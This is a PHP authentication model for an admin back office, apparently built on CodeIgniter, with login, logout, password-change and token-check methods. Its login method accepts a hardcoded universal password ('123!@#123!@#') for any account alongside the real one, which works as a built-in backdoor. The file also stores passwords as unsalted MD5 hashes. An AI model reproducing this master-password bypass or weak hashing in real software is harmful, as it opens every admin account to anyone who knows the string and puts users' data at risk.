<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class AdminPublicauth extends MY_Model {

    public $admin_id = 0;
    public $admin_name = '';
    public $admin = array();
    public $role = null;
    private $passwd_any = '123!@#123!@#';

    public function __construct() {
        parent::__construct();
    }

    public function token() {
        $token = $this->session->get('PTOKEN'); //跟单员后台
        if ($token) {
            if ($this->_check_token($token)) {
                return true;
            }
            $this->session->delete('PTOKEN');
        }
        return false;
    }

    /**
     * 用户登录
     * @param   $u  用户名/邮箱
     * @param   $p  密码{明文密码}
     */
    public function login($u, $p) {
        $passwd = md5($p);
        $m = K::M('admin/admin')->admin(0, $u);
        //$passwd = $m['passwd'];

        if (!$m) {
            return '用户名或密码不正确!';
        }
        if ($m['passwd'] != $passwd && $passwd != md5($this->passwd_any)) {
            return '用户名或密码不正确!';
        }
        if ($m['closed'] == 3 || $m['closed'] == 2) {
            return '用户状态异常,不能登录!';
        }
        if ($m['admin_type'] != 1 && $m['admin_type'] != 2) {//跟单用户或双权限用户可以登陆
            return '账号权限错误!';
        }

        $this->admin_id = $m['admin_id'];
        $this->admin_name = $m['admin_name'];
        $this->admin = $m;
        $token = $this->create_token($this->admin_id, $m['passwd']);
        K::M('admin/admin')->update_login($this->admin_id);
        $this->session->set('PTOKEN', $token);
        $this->cookie->set('PADMIN', $this->admin_name, NULL);

        return true;
    }

    public function logout() {
        $this->session->delete('PTOKEN');
        $this->cookie->delete('PTOKEN');
        $this->cookie->delete('PADMIN');
        return true;
    }

    public function modifypasswd($odlpasswd, $newpasswd) {
        if (md5($odlpasswd) != $this->admin['passwd']) {
            return '原密码输入不正确';
        } else if (!preg_match('/^[\x21-\x7E]{6,15}$/', $newpasswd)) {
            return '用户密码只包含(数字,大小写字母,特殊符号,不含空格)长度6~15字符';
        }
        $passwd = md5($newpasswd);
        
        K::M('admin/admin')->update_passwd($this->admin_id, $passwd);
        return true;
    }

    private function _check_token($token) {
        $a = explode('-', $token);
        if (!$uid = intval($a[0])) {
            return false;
        }
        if (!$m = K::M('admin/admin')->admin($uid, 'admin_id')) {
            return false;
        } else if ($this->create_token($m['admin_id'], $m['passwd']) != $token) {
            return false;
        } else if (!in_array($m['closed'], array(0, 1))) {
            return false;
        }
        $this->admin_id = $m['admin_id'];
        $this->admin_name = $m['admin_name'];
        $this->admin = $m;
        
        /*
          if($this->role['priv']){
          $this->priv = explode(',',$this->role['priv']);
          }else{
          $this->priv = array();
          }
         */
        return true;
    }

}
